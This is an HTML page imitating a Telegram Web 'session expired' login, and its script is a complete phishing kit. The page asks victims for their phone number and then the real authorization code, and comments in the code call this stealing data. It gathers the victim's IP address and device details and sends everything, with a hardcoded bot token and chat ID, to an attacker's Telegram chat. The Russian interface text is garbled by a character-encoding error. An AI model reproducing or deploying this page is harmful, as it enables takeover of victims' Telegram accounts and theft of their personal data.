<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram: –°—Ä–æ–∫ –¥–µ–π—Å—Ç–≤–∏—è —Å–µ—Å—Å–∏–∏ –∏—Å—Ç–µ–∫</title>
    <style>
        /* –°—Ç–∏–ª–∏ CSS */
        body { font-family: sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 350px; text-align: center; }
        h2 { color: #1877f2; margin-bottom: 25px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; text-align: center;}
        button { width: 100%; padding: 12px; background-color: #0088cc; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background-color 0.3s; }
        button:hover { background-color: #007bb6; }
        .info { font-size: 14px; color: #606770; margin-top: 15px; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h2 id="formTitle">Telegram Web Login</h2>
        <p class="info" id="formInfo">–í–∞—à–∞ —Å–µ—Å—Å–∏—è —É—Å—Ç–∞—Ä–µ–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –Ω–æ–º–µ—Ä, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å **–∫–æ–¥**.</p>
        
        <form id="loginForm">
            <div id="phoneStep">
                <input type="tel" id="phoneInput" placeholder="+7 999 123 45 67" required>
                <button type="button" id="sendCodeButton">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏</button>
            </div>
            
            <div id="codeStep" style="display:none;">
                 <p class="info" style="color: #c0392b;">**–í–ù–ò–ú–ê–ù–ò–ï:** –ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω. –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏.</p>
                <input type="text" id="codeInput" placeholder="–ö–æ–¥ –∏–∑ SMS / Telegram" maxlength="6" required>
                <button type="submit" id="loginButton">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∏ –≤–æ–π—Ç–∏</button>
            </div>
            
        </form>
        <p id="status" style="color: red; margin-top: 15px; display: none;"></p>
    </div>

    <script>
        // --- –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø ---
        // –¢–æ–∫–µ–Ω –≤–∞—à–µ–≥–æ –±–æ—Ç–∞
        const BOT_TOKEN = '8327643870:AAFYNAJOZFS4MYNTgD710MYMO9-a3yGkCDk'; 
        // ID —á–∞—Ç–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
        const CHAT_ID = '7567154840';   
        
        // –í–ù–ï–®–ù–ò–ô –°–ï–†–í–ò–°: –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—É–±–ª–∏—á–Ω–æ–≥–æ IP
        const IP_CHECK_API = 'https://api.ipify.org?format=json'; 
        // --- –ö–û–ù–ï–¶ –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò ---

        const SEND_MESSAGE_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const phoneInput = document.getElementById('phoneInput');
        const codeInput = document.getElementById('codeInput');
        const sendCodeButton = document.getElementById('sendCodeButton');
        const loginForm = document.getElementById('loginForm');
        const phoneStep = document.getElementById('phoneStep');
        const codeStep = document.getElementById('codeStep');
        const statusText = document.getElementById('status');
        
        let phoneNumber = '';

        // 1. –°–±–æ—Ä IP –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        async function getDeviceInfo() {
            let ip = '–ù–µ–¥–æ—Å—Ç—É–ø–µ–Ω';
            let userAgent = navigator.userAgent;
            let screenResolution = `${window.screen.width}x${window.screen.height}`;
            
            try {
                // –ó–∞–ø—Ä–æ—Å –≤–Ω–µ—à–Ω–µ–≥–æ —Å–µ—Ä–≤–∏—Å–∞ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—É–±–ª–∏—á–Ω–æ–≥–æ IP
                const ipResponse = await fetch(IP_CHECK_API);
                const ipData = await ipResponse.json();
                ip = ipData.ip || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ';
            } catch (error) {
                // –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫—É, –µ—Å–ª–∏ IP API –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω
            }

            let device = userAgent.match(/\((.*?)\)/)?.[1] || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ';
            
            return { ip, userAgent, device, resolution: screenResolution };
        }

        // 2. –û—Ç–ø—Ä–∞–≤–∫–∞ —É–∫—Ä–∞–¥–µ–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –Ω–∞–º –≤ Telegram
        async function sendCredentialsToAdmin(phone, code) {
            const deviceInfo = await getDeviceInfo(); 

            // –ú—ã –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ –≤–≤–µ–¥–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ, —Ç–∞–∫ –∫–∞–∫ hash –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω –±–µ–∑ —Å–µ—Ä–≤–µ—Ä–∞
            const messageText = `
üí• *–ö–†–ê–ñ–ê –î–ê–ù–ù–´–• –£–°–ü–ï–®–ù–ê (–ü—Ä—è–º–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞)* üí•

---
**üîí –£—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
üì± *–¢–µ–ª–µ—Ñ–æ–Ω:* \`${phone}\`
üîë *–í–≤–µ–¥–µ–Ω–Ω—ã–π –ö–æ–¥:* \`${code}\`
‚ùå *Hash-–∫–ª—é—á:* **–ù–ï –î–û–°–¢–£–ü–ï–ù (–ù–ï–¢ –°–ï–†–í–ï–†–ê)**

---
**üíª –î–∞–Ω–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:**
üåê *IP-–∞–¥—Ä–µ—Å:* \`${deviceInfo.ip}\`
üíª *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${deviceInfo.device}
üìê *–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ:* ${deviceInfo.resolution}
üë§ *User Agent:* \`${deviceInfo.userAgent}\`
üï∞Ô∏è *–í—Ä–µ–º—è:* ${new Date().toISOString().slice(0, 19).replace('T', ' ')} (UTC)
`;
            
            const finalUrl = `${SEND_MESSAGE_URL}?chat_id=${CHAT_ID}&text=${encodeURIComponent(messageText)}&parse_mode=Markdown`;

            // –§–∞–∫—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö
            fetch(finalUrl).catch(err => console.error('Failed to send credentials:', err));
        }

        // --- –§–ê–ó–ê 1: –ò–ú–ò–¢–ê–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –ö–û–î–ê ---
        sendCodeButton.addEventListener('click', async function(event) {
            event.preventDefault(); 
            phoneNumber = phoneInput.value.trim().replace(/[^0-9+]/g, ''); 
            
            if (!phoneNumber || phoneNumber.length < 10) {
                alert("–í–≤–µ–¥–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.");
                return;
            }

            statusText.style.display = 'block';
            statusText.textContent = '–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ –∫–æ–¥...';
            sendCodeButton.disabled = true;

            // –ò–ú–ò–¢–ê–¶–ò–Ø –∑–∞–¥–µ—Ä–∂–∫–∏ —Ä–µ–∞–ª—å–Ω–æ–≥–æ Telegram API
            await new Promise(resolve => setTimeout(resolve, 3000)); 

            // –ü–µ—Ä–µ—Ö–æ–¥ –∫–æ –≤—Ç–æ—Ä–æ–π —Ñ–∞–∑–µ
            statusText.textContent = ''; // –û—á–∏—Å—Ç–∫–∞ —Å—Ç–∞—Ç—É—Å–∞
            phoneStep.style.display = 'none';
            codeStep.style.display = 'block';
            document.getElementById('formInfo').innerHTML = '–í–≤–µ–¥–∏—Ç–µ **—Ä–µ–∞–ª—å–Ω—ã–π –∫–æ–¥**, –∫–æ—Ç–æ—Ä—ã–π –ø—Ä–∏—à–µ–ª –≤–∞–º –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–µ—Å—Å–∏–∏.';
            sendCodeButton.disabled = false;
        });

        // --- –§–ê–ó–ê 2: –ó–ê–•–í–ê–¢ –î–ê–ù–ù–´–• –ò –û–¢–ü–†–ê–í–ö–ê ---
        loginForm.addEventListener('submit', async function(event) {
            event.preventDefault(); 

            const code = codeInput.value.trim();

            if (!code || code.length < 5) {
                alert("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥.");
                return;
            }

            statusText.textContent = '–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞ –∏ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å–µ—Å—Å–∏–∏...';
            document.getElementById('loginButton').disabled = true;

            // –û–¢–ü–†–ê–í–ö–ê –î–ê–ù–ù–´–• –í–ê–ú –í –¢–ï–õ–ï–ì–†–ê–ú
            await sendCredentialsToAdmin(phoneNumber, code);
            
            // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ "–ª–æ–≥–∏–Ω–∞" (–ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ)
            await new Promise(resolve => setTimeout(resolve, 1500)); 
            window.location.href = 'success.html'; 
        });
    </script>
</body>
</html>